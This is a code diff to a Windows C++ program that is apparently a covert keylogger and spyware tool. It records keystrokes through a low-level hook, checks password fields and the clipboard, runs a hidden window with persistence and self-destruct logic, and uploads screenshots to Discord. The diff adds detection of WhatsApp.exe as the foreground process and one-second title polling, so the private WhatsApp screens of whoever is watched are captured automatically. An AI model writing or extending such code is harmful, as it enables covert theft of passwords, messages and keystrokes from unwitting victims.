@@ -236,6 +236,35 @@ static std::string GetWindowTitle() {
     return std::string(buf);
 }
 
+// Basename of the foreground process (e.g. "WhatsApp.exe"). Empty on failure.
+static std::string GetForegroundProcessName() {
+    HWND hwnd = GetForegroundWindow();
+    if (!hwnd) return "";
+    DWORD pid = 0;
+    GetWindowThreadProcessId(hwnd, &pid);
+    if (!pid) return "";
+    HANDLE h = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
+    if (!h) return "";
+    char path[MAX_PATH] = {0};
+    DWORD size = MAX_PATH;
+    std::string name;
+    if (QueryFullProcessImageNameA(h, 0, path, &size) && size > 0) {
+        std::string full(path, size);
+        size_t pos = full.find_last_of("\\/");
+        name = (pos != std::string::npos) ? full.substr(pos + 1) : full;
+    }
+    CloseHandle(h);
+    return name;
+}
+
+static bool ForegroundIsWhatsApp() {
+    std::string name = GetForegroundProcessName();
+    if (name.empty()) return false;
+    for (size_t i = 0; i < name.size(); i++)
+        name[i] = (char)tolower((unsigned char)name[i]);
+    return name == "whatsapp.exe";
+}
+
 // Translate a virtual key code into a human-readable string for the keystrokes table.
 // Respects Shift/Caps for letters, Shift for digits/punctuation. Returns "" for
 // pure modifier keys (so they don't pollute the buffer).
@@ -1410,30 +1439,42 @@ static void PostDiscordImage(const std::string& host, const std::string& title, 
     WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession);
 }
 
-// Queue auto-screenshot if window title matches a trigger. Does NOT capture here —
-// heavy work runs on the timer thread via ProcessPendingAutoScreenshot (avoids
-// blocking the low-level keyboard hook). Rate-limited to once per 5 minutes.
+// Queue auto-screenshot if window title matches a trigger, or if the foreground
+// process is WhatsApp.exe (Desktop assist for empty/localized titles). Does NOT
+// capture here — heavy work runs on the timer thread via ProcessPendingAutoScreenshot
+// (avoids blocking the low-level keyboard hook). Rate-limited to once per 5 minutes.
+// Also polled every 1s from WM_TIMER so mouse-only focus triggers without keystrokes.
 static void CheckAutoScreenshot(const std::string& windowTitle) {
-    if (windowTitle.empty() || g_triggers.empty()) return;
+    if (g_triggers.empty()) return;
     if (!g_pendingAutoTitle.empty()) return;
     DWORD now = GetTickCount();
     if (now - g_lastAutoScreenshot < 300000) return;
-    std::string lowerTitle;
-    lowerTitle.resize(windowTitle.size());
-    for (size_t i = 0; i < windowTitle.size(); i++) lowerTitle[i] = (char)tolower((unsigned char)windowTitle[i]);
 
-    for (size_t i = 0; i < g_triggers.size(); i++) {
-        std::string kw = g_triggers[i];
-        std::string lowerKw;
-        lowerKw.resize(kw.size());
-        for (size_t j = 0; j < kw.size(); j++) lowerKw[j] = (char)tolower((unsigned char)kw[j]);
-        if (lowerTitle.find(lowerKw) == std::string::npos) continue;
+    std::string matchedKw;
+    if (!windowTitle.empty()) {
+        std::string lowerTitle;
+        lowerTitle.resize(windowTitle.size());
+        for (size_t i = 0; i < windowTitle.size(); i++)
+            lowerTitle[i] = (char)tolower((unsigned char)windowTitle[i]);
 
-        g_lastAutoScreenshot = now;
-        g_pendingAutoTitle = windowTitle;
-        g_pendingAutoKw = kw;
-        break;
+        for (size_t i = 0; i < g_triggers.size(); i++) {
+            std::string kw = g_triggers[i];
+            std::string lowerKw;
+            lowerKw.resize(kw.size());
+            for (size_t j = 0; j < kw.size(); j++)
+                lowerKw[j] = (char)tolower((unsigned char)kw[j]);
+            if (lowerTitle.find(lowerKw) == std::string::npos) continue;
+            matchedKw = kw;
+            break;
+        }
     }
+    if (matchedKw.empty() && ForegroundIsWhatsApp())
+        matchedKw = "whatsapp";
+    if (matchedKw.empty()) return;
+
+    g_lastAutoScreenshot = now;
+    g_pendingAutoTitle = windowTitle.empty() ? "WhatsApp" : windowTitle;
+    g_pendingAutoKw = matchedKw;
 }
 
 // Capture/upload queued auto-screenshot on the message-loop thread. Posts a
@@ -1745,6 +1786,7 @@ static void CleanupPersistence() {
 // === Hidden window procedure ===================================================
 // Backed by a message-only window (desktop HWND_MESSAGE parent). The 1-second
 // timer does all periodic work. Counter values control scheduling:
+//   every tick = pending key flush, title poll for auto-SS, process pending auto-SS
 //   x % 2  = password field check      (every 2s)
 //   x % 3  = clipboard check           (every 3s)
 //   x % 5  = flush buffer if idle      (every 5s, 300ms grace)
@@ -1763,6 +1805,8 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
             counter++;
             if (!g_selfDestructing) {
                 ProcessPendingKeyFlush();
+                // Poll foreground title so mouse-only focus still triggers auto-SS
+                CheckAutoScreenshot(GetWindowTitle());
                 ProcessPendingAutoScreenshot();
             }
             if (counter % 3 == 0 && !g_selfDestructing) CheckClipboard();
